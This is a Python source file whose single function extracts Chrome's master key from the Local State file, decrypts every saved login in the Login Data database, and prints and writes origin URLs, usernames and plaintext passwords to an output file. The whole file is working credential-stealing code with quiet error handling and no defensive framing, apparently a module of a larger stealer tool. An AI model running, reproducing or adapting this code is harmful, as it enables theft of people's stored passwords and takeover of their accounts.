import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def ChromePasswords(
        profile="Default",
        savefname="chromePass_default",
        save_folder_name=None,
        error_file=None,
        data_write_file=None

):

    def get_chrome_datetime(chromedate):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            if error_file:
                error_file.write(f"\n{e}")

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            try:
                local_state = json.loads(local_state)
            except Exception as e:
                if error_file:
                    error_file.write(f"\n{e}")

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]

        try:
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            if error_file:
                error_file.write(f"\n{e}")

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]

            try:
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except Exception as e:
                if error_file:
                    error_file.write(f"\n{e}")

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", profile, "Login Data")

        filename = os.path.join(save_folder_name, savefname)

        try:
            shutil.copyfile(db_path, filename)
        except Exception as e:
            if error_file:
                error_file.write(
                    f"\nUnable to copy '{db_path}' to '{filename}' - {e}")

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor = db.cursor()
        # `logins` table has the data we need
        try:
            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        except Exception as e:
            if error_file:
                error_file.write(f"\nUnable to execute SQL Command - {e}")

        # iterate over all rows
        try:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    print(f"Origin URL: {origin_url}")
                    data_write_file.write(f"\nOrigin URL: {origin_url}")
                    print(f"Action URL: {action_url}")
                    data_write_file.write(f"\nAction URL: {action_url}")
                    print(f"Username: {username}")
                    data_write_file.write(f"\nUsername: {username}")
                    print(f"Password: {password}")
                    data_write_file.write(f"\nPassword: {password}")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    print(
                        f"Creation date: {str(get_chrome_datetime(date_created))}")
                    data_write_file.write(
                        f"\nCreation date: {str(get_chrome_datetime(date_created))}")
                if date_last_used != 86400000000 and date_last_used:
                    print(
                        f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                    data_write_file.write(
                        f"\nLast Used: {str(get_chrome_datetime(date_last_used))}")
                print("="*50)
                data_write_file.write(
                    "\n\n==================================================\n")

        except Exception as e:
            if error_file:
                error_file.write(f"\n{e}")

        cursor.close()
        db.close()

    try:
        main()
    except Exception as e:
        print("Error: ", e)
